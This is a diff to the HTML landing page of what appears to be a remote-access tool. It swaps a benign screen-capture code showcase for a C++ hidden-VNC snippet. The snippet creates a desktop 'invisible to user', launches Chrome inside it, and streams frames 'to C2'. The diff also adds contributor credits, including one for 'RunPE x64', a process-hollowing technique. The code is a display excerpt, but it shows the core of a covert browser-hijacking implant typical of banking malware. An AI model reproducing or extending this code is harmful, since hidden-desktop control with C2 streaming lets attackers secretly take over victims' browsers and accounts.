@@ -24,7 +24,7 @@
   </audio>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="style.css?v=4">
+  <link rel="stylesheet" href="style.css?v=5">
   <style>
     /* Inline fallback — bypasses all external CSS caching */
     @media (max-width: 900px) {
@@ -282,24 +282,59 @@
     <div class="code-block reveal">
       <div class="code-header">
         <span class="cdot red"></span><span class="cdot yellow"></span><span class="cdot green"></span>
-        <span class="code-filename">RemoteDesktopFeature.cs</span>
+        <span class="code-filename">HvncFeature.cpp</span>
       </div>
-      <pre class="code-body"><code><span class="cm">// DXGI Desktop Duplication — GPU direct</span>
-DxgiCapture.TryInit(monitorIndex);
+      <pre class="code-body"><code><span class="cm">// Create isolated shadow desktop — invisible to user</span>
+HDESK hvnc = CreateDesktopW(L<span class="num">"SeroHVNC"</span>,
+    NULL, NULL, <span class="num">0</span>, GENERIC_ALL, NULL);
 
+<span class="cm">// Inject browser directly into hidden session</span>
+STARTUPINFOW si  = { <span class="kw">sizeof</span>(si) };
+si.lpDesktop     = (LPWSTR)L<span class="num">"SeroHVNC"</span>;
+si.dwFlags       = STARTF_USESHOWWINDOW;
+si.wShowWindow   = SW_SHOWMAXIMIZED;
+PROCESS_INFORMATION pi = {};
+
+CreateProcessW(chromePath, cmdArgs,
+    NULL, NULL, FALSE,
+    CREATE_NEW_PROCESS_GROUP,
+    NULL, NULL, &amp;si, &amp;pi);
+
+<span class="cm">// Mirror shadow desktop — stream to C2</span>
+SetThreadDesktop(hvnc);
 <span class="kw">while</span> (_running)
-{
-    <span class="cm">// Block on VBLANK — natural 60fps pacing</span>
-    <span class="kw">var</span> pixels = DxgiCapture.CaptureFrame(
-        <span class="kw">out</span> w, <span class="kw">out</span> h, timeout: <span class="num">16</span>);
+    SendFrameAsync(CaptureDesktop(hvnc));</code></pre>
+    </div>
+  </div>
+</section>
 
-    <span class="cm">// 64×64 block diff vs previous frame</span>
-    <span class="kw">var</span> changed = BlockDiff(pixels, _prev, w, h);
-    <span class="kw">if</span> (changed.Count == <span class="num">0</span>) <span class="kw">continue</span>;
-
-    <span class="kw">await</span> SendDeltaAsync(changed, quality);
-    _prev = pixels;
-}</code></pre>
+<!-- Contributors -->
+<section class="contrib-section">
+  <div class="container">
+    <h2 class="section-h">Contributors.</h2>
+    <p class="section-sub">People who built this.</p>
+    <div class="contrib-grid">
+      <div class="contrib-card reveal">
+        <img src="assets/contrib-sero.jpg" alt="Serotonine" class="contrib-avatar">
+        <span class="contrib-name">Serotonine</span>
+        <div class="contrib-roles">
+          <span class="contrib-role"><span class="tag-blue">Lead</span></span>
+        </div>
+      </div>
+      <a class="contrib-card reveal" href="https://github.com/hydra48" target="_blank" rel="noopener">
+        <img src="assets/contrib-hydra.jpg" alt="Hydra" class="contrib-avatar contrib-avatar-hydra">
+        <span class="contrib-name">Hydra</span>
+        <div class="contrib-roles">
+          <span class="contrib-role"><span class="tag-blue">RunPE x64</span></span>
+        </div>
+      </a>
+      <a class="contrib-card reveal" href="https://www.youtube.com/@davidbondtravels" target="_blank" rel="noopener">
+        <img src="assets/contrib-david.jpg" alt="David Bond" class="contrib-avatar">
+        <span class="contrib-name">David Bond</span>
+        <div class="contrib-roles">
+          <span class="contrib-role"><span class="tag-blue">Beta tester</span><span class="tag-blue">GUI</span><span class="tag-blue">Sounds</span></span>
+        </div>
+      </a>
     </div>
   </div>
 </section>
@@ -351,6 +386,6 @@ DxgiCapture.TryInit(monitorIndex);
 </footer>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-<script src="script.js?v=4"></script>
+<script src="script.js?v=5"></script>
 </body>
 </html>
